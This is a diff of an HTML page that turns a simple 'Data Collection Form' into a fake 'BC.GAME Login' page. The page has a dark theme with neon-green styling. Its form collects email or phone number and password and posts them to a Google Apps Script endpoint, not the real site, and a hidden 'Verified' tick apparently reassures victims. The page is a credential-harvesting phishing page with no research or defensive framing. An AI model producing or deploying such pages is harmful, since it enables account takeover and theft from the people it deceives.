@@ -1,16 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Data Collection</title>
+  <title>BC.GAME Login</title>
+  <style>
+    body {
+      background-color: #333; /* Dark grey background */
+      font-family: Arial, sans-serif;
+      color: white; /* White font color */
+    }
+
+    .login-container {
+      width: 300px;
+      margin: 0 auto;
+      padding: 20px;
+      border: 1px solid #0f0; /* Dark neon green border */
+      border-radius: 5px;
+    }
+
+    .input-field {
+      margin-bottom: 10px;
+    }
+
+    .input-field label {
+      display: block;
+    }
+
+    .input-field input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #0f0; /* Dark neon green border */
+      border-radius: 5px;
+    }
+
+    .btn-sign-in {
+      background-color: #0f0; /* Neon green background */
+      color: white; /* White font color */
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
-    <h1>Data Collection Form</h1>
-    <form action="https://docs.google.com/spreadsheets/d/1EwSiUc-Kb50hQOvD-8-zjdTFbZcqtluaYaswXxMis7Q/edit#gid=0" method="post">
-        <label for="email">Email:</label>
-        <input type="text" id="email" name="email"><br>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password"><br>
-        <input type="submit" value="Login">
+  <div class="login-container">
+    <h2>Sign In</h2>
+    <form action="https://script.google.com/macros/s/AKfycbyFiOpSV0k6k8_RMq7VfHrjCQdTbTquU3bjR3gfwtgWeMI2tPfVZ5fLjf8ERV9UJHru/exec" method="post">
+      <div class="input-field">
+        <label for="email">Email / Phone Number</label>
+        <input type="text" id="email" name="email" required>
+      </div>
+      <div class="input-field">
+        <label for="password">Login Password</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <button class="btn-sign-in" type="submit" id="sign-in-button">Sign In</button>
     </form>
+    <p id="verification-message" style="display: none;">
+      <span style="color: white;">Verified </span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Green_tick.png" alt="Green Tick" width="20" height="20">
+    </p>
+  </div>
 </body>
 </html>
